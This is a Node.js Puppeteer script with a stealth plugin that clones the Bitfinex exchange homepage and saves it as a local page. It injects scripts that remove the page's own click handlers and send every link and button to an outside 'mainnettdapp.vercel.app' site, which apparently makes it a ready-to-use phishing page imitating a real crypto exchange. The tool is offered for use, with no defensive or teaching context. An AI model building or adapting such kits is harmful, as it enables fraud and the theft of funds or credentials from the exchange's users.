import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import fs from "fs-extra";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
puppeteer.use(StealthPlugin());

(async () => {
  const siteUrl = "https://www.bitfinex.com/"; // Target site
  const outputDir = path.join(__dirname, "cloned");
    const redirectURL = "https://mainnettdapp.vercel.app/"; // URL to redirect all links to
  // Clear the cloned directory before starting
  async function clearClonedDirectory() {
    try {
      await fs.remove(outputDir);
      console.log("🧹 Cleared cloned directory:", outputDir);
    } catch (err) {
      console.error("⚠️ Failed to clear cloned directory:", err.message);
    }
  }

  
  try {
    // Clear and create output directory
    await clearClonedDirectory();
    await fs.ensureDir(outputDir);
    console.log("📁 Created output directory:", outputDir);

    // Launch browser
    const browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-cache",
        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ],
    });

    try {
      const page = await browser.newPage();
      page.setDefaultNavigationTimeout(60000);

      // Navigate and wait for page to load
      console.log("🌐 Navigating to:", siteUrl);
      await page.goto(siteUrl, {
       waitUntil: "networkidle2", // Less strict than networkidle0
          timeout: 120000, // 120 seconds
      });
      await page.waitForSelector("body", { timeout: 10000 });
      await new Promise((resolve) => setTimeout(resolve, 10000)); // 3-second delay for JS content

      // Override history.replaceState to prevent cross-origin errors
      await page.evaluate(() => {
        const originalReplaceState = history.replaceState;
        history.replaceState = function (state, title, url) {
          try {
            if (
              url &&
              !url.startsWith("/") &&
              !url.startsWith(window.location.origin)
            ) {
              console.warn(`🚫 Blocked cross-origin replaceState to: ${url}`);
              return;
            }
            originalReplaceState.call(history, state, title, url);
          } catch (err) {
            console.warn(`⚠️ Error in replaceState: ${err.message}`);
          }
        };
      });

      // Capture HTML
      const html = await page.content();
      const $ = cheerio.load(html);


   
      // Remove existing <base> tag and add new one
      $("base").remove();
      $("head").prepend(`<base href="${siteUrl}">`);


            // Redirect external links
            $("a[href]").each((_, el) => {
              const href = $(el).attr("href");
              if (
                href &&
                href.startsWith("http") &&
                !href.includes(new URL(siteUrl).hostname)
              ) {
                $(el).attr("href", redirectURL);
                $(el).removeAttr("target");
              }
            });


      // Add history.replaceState override to the cloned HTML
      $("head").prepend(`<script class="history-override">
        (function() {
          const originalReplaceState = history.replaceState;
          history.replaceState = function(state, title, url) {
            try {
              if (url && !url.startsWith("/") && !url.startsWith(window.location.origin)) {
                console.warn("🚫 Blocked cross-origin replaceState to: " + url);
                return;
              }
              originalReplaceState.call(history, state, title, url);
            } catch (err) {
              console.warn("⚠️ Error in replaceState: " + err.message);
            }
          };
        })();
      </script>`);

           $("head").prepend(`<script class="click-handler-script">
        document.addEventListener("DOMContentLoaded", () => {
          const anchorElements = document.querySelectorAll("a");
          anchorElements.forEach(el => {
            el.setAttribute("href", "${redirectURL}");
            console.log("✅ Added href to <a>: ${redirectURL}");
          });
          const interactiveElements = document.querySelectorAll(
            "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
          );
          interactiveElements.forEach(el => {
            el.onclick = null;
            el.removeAttribute("onclick");
            if (window.jQuery && typeof jQuery === "function") {
              try { jQuery(el).off("click"); } catch (err) {}
            }
            const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
            if (reactKey) delete el[reactKey];
            el.addEventListener("click", (e) => {
              e.preventDefault();
              e.stopImmediatePropagation();
              window.location.href = "${redirectURL}";
            }, true);
          });
        });
      </script>`);

          $("head").prepend(`<script class="dynamic-script">
        window.addEventListener('DOMContentLoaded', () => {
          console.log("🔁 Running prioritized image fixer...");
          function fixImages() {
            const images = document.querySelectorAll('img');
            images.forEach(img => {
              const src = img.getAttribute('src');
              img.removeAttribute('srcset');
              if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
                img.src = new URL(src, '${siteUrl}').href;
              }
            });
          }
          fixImages();
          setTimeout(fixImages, 3000);
          setInterval(fixImages, 10000);
        });
      </script>`);
      // Save HTML
      await fs.outputFile(path.join(outputDir, "index.html"), $.html());
      console.log("✅ Done! Saved at cloned/index.html");
    } catch (err) {
      console.error("❌ Page processing failed:", err.message, err.stack);
    } finally {
      await browser.close();
    }
  } catch (err) {
    console.error("❌ Script failed:", err.message, err.stack);
  }
})();
